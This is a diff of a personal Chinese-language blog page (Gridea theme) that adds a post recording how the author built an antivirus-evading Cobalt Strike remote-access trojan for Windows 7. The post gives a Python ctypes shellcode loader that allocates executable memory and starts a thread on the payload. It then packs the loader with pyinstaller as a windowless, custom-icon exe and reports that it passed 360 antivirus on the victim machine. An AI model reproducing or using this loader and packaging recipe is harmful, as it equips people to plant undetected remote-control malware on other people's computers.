@@ -4,7 +4,7 @@
 <meta name="description" content=""/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
 
-<title>Gridea | Komorebi</title>
+<title>弟弟学习纪录001&lt; Cs-win7免杀远控马 &gt; | Komorebi</title>
 
 <link rel="shortcut icon" href="https://komorebi7369.github.io/favicon.ico?v=1598599087566">
 
@@ -25,11 +25,11 @@
 
 
 
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
 </head>
 <body>
 <div class="main gt-bg-theme-color-first">
-    <div class="main-content">
-        <nav class="navbar navbar-expand-lg">
+    <nav class="navbar navbar-expand-lg">
     <div class="navbar-brand">
         <img class="user-avatar" src="/images/avatar.png" alt="头像">
         <div class="site-name gt-c-content-color-first">
@@ -85,51 +85,70 @@
     </div>
 </nav>
 
-        <div class="current-tag-container">
-            <h2 class="title gt-c-content-color-first">
-                #Gridea
-            </h2>
-        </div>
-        <div class="post-list-container">
-    <div class="post-inner">
-        
-            <div class="post gt-bg-theme-color-second">
-                <div class="post-left">
-                    <div>
-                        
-                        <a href="https://komorebi7369.github.io/hello-gridea/">
-                            <span class="post-title gt-c-content-color-first">Hello Gridea</span>
-                        </a>
-                    </div>
-                    <div class="gt-post-content post-abstract gt-c-content-color-second">
-                        <p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-
-                    </div>
-                    <div class="post-info">
-                        <time class="post-time gt-c-content-color-first">
-                            发布于 · 2018-12-12 ·
-                        </time>
-                        
-                            <a href="https://komorebi7369.github.io/6tRZVZpum/" class="post-tag">
-                                # Gridea
-                            </a>
-                        
-                    </div>
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    弟弟学习纪录001&lt; Cs-win7免杀远控马 &gt;
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2020-08-27 ·
+                    </time>
+                    
                 </div>
-                
-                    <a href="https://komorebi7369.github.io/hello-gridea/" class="post-feature-image"
-                       style="background-image: url('https://komorebi7369.github.io/post-images/hello-gridea.png')">
-                    </a>
-                
-            </div>
+                <div class="post-content">
+                    <h3 id="前言">前言</h3>
+<pre><code>~~ 为了防止自己忘掉，所以记录一下之前测试的win7免杀马 ~~
+</code></pre>
+<!-- more -->
+<hr>
+<h3 id="前期工作">前期工作</h3>
+<p>win10-攻击机(python2,pyinstaller)<br>
+win7-受害机(360)<br>
+vps-cs服务器</p>
+<hr>
+<h3 id="步骤">步骤</h3>
+<ol>
+<li>先使用cs生成一个py的payload<br>
+<img src="https://komorebi7369.github.io/post-images/1598596717043.jpg" alt="" loading="lazy"><br>
+<img src="https://komorebi7369.github.io/post-images/1598596820539.jpg" alt="" loading="lazy"></li>
+<li>将生成的payload代码内容添加到pyshell.py文件中，修改其中的shellcode内容</li>
+</ol>
+<pre><code>import ctypes
+
+shellcode =  &quot;&quot;
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
+ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
+handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
+</code></pre>
+<ol>
+<li>修改shellcode内容后，使用pyinstaller进行编译，编译为exe文件。<font size=2>（注：pyinstaller在py2环境中运行效果良好，py3的话会报错）</font></li>
+</ol>
+<h4 id="安装">安装</h4>
+<p><code>pip install pyinstaller</code></p>
+<h4 id="打包">打包</h4>
+<p><code>pyinstaller -F -w -i x.icon payload.py</code></p>
+<p><font size=2>参数说明：</font><br>
+<font size=2>-F，-onefile 产生单个的可执行文件</font><br>
+<font size=2>-w，--windowed，--noconsolc   指定程序运行时不显示命令行窗口（仅对 Windows 有效）</font><br>
+<font size=2>-i,  指定图标</font></p>
+<ol start="4">
+<li>将exe文件上传到受害机中，杀毒查看并未发现有木马病毒。</li>
+</ol>
+
+                </div>
+            </article>
+        </div>
+
         
-    </div>
-</div>
-        <div class="pagination-container">
-    
-    
-</div>
+
+        
+
+        
+
+        
 
         <div class="site-footer gt-c-content-color-first">
     <div class="slogan gt-c-content-color-first">听说樱花飘落的速度是每秒五厘米</div>
